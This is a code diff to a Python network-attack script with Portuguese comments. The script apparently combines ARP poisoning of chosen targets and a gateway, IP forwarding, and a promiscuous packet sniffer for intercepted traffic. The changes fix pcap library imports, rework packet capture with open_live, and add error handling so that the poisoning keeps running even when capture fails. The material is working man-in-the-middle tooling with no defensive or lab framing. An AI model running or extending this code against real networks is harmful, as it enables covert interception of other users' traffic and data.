@@ -7,7 +7,17 @@ import os
 import socket
 import struct
 import binascii
-import pylibpcap as pcap
+
+# Tratando importações diferentes para pcap dependendo do que está disponível
+try:
+    import pylibpcap as pcap
+except ImportError:
+    try:
+        import pcap
+    except ImportError:
+        print("Erro: Biblioteca pcap não encontrada. Instale com: pip install pylibpcap ou pip install pypcap")
+        sys.exit(1)
+
 import dpkt
 from dpkt.ethernet import Ethernet
 from dpkt.arp import ARP
@@ -351,27 +361,35 @@ def start_sniffer(interface, targets, gateway):
     packet_stats = {'total': 0, 'tcp': 0, 'udp': 0, 'icmp': 0}
     
     # Criar um objeto de captura
-    pc = pcap.pcap(name=interface, promisc=True, immediate=True)
-    
-    # Configurar filtro BPF - capturar pacotes IP mas não ARP
-    pc.setfilter('ip and not arp')
-    
-    print(f"[*] Sniffer iniciado. Capturando pacotes...")
-    
-    # Iniciar thread de captura
-    def capture_thread():
-        try:
-            # Para cada pacote capturado
-            for timestamp, packet in pc:
-                process_packet(packet, targets, gateway, packet_stats)
-        except KeyboardInterrupt:
-            pass
-    
-    thread = threading.Thread(target=capture_thread)
-    thread.daemon = True
-    thread.start()
-    
-    return pc, packet_stats, thread
+    try:
+        # Corrigindo a forma de criar o objeto pcap
+        pc = pcap.open_live(interface, 65535, True, 100)
+        
+        # Configurar filtro BPF - capturar pacotes IP mas não ARP
+        pc.setfilter('ip and not arp')
+        
+        print(f"[*] Sniffer iniciado. Capturando pacotes...")
+        
+        # Iniciar thread de captura
+        def capture_thread():
+            try:
+                # Para cada pacote capturado
+                while True:
+                    packet = pc.next()
+                    if packet:
+                        process_packet(packet[1], targets, gateway, packet_stats)
+            except KeyboardInterrupt:
+                pass
+        
+        thread = threading.Thread(target=capture_thread)
+        thread.daemon = True
+        thread.start()
+        
+        return pc, packet_stats, thread
+    except Exception as e:
+        print(f"[!] Erro ao iniciar sniffer: {e}")
+        # Retornar valores vazios para evitar erros subsequentes
+        return None, packet_stats, None
 
 
 def enable_ip_forwarding():
@@ -425,6 +443,10 @@ def main():
     
     # 5. Inicie o sniffer de pacotes
     sniffer, packet_stats, sniffer_thread = start_sniffer(interface, targets, gateway)
+    
+    # Verificar se o sniffer foi iniciado corretamente
+    if sniffer is None:
+        print("[!] O sniffer não pôde ser iniciado. O envenenamento ARP continuará, mas sem captura de pacotes.")
     
     # Após iniciar o sniffer, mas antes do loop de comandos:
     print("\n[*] Sistema configurado:")
@@ -528,8 +550,11 @@ def main():
         control_queue.put(('quit',))
         poison_thread.join(timeout=5)
         # Para o sniffer
-        if hasattr(sniffer, 'close'):
-            sniffer.close()
+        if sniffer is not None:
+            try:
+                sniffer.close()
+            except:
+                pass
 
 
 def checksum(data):
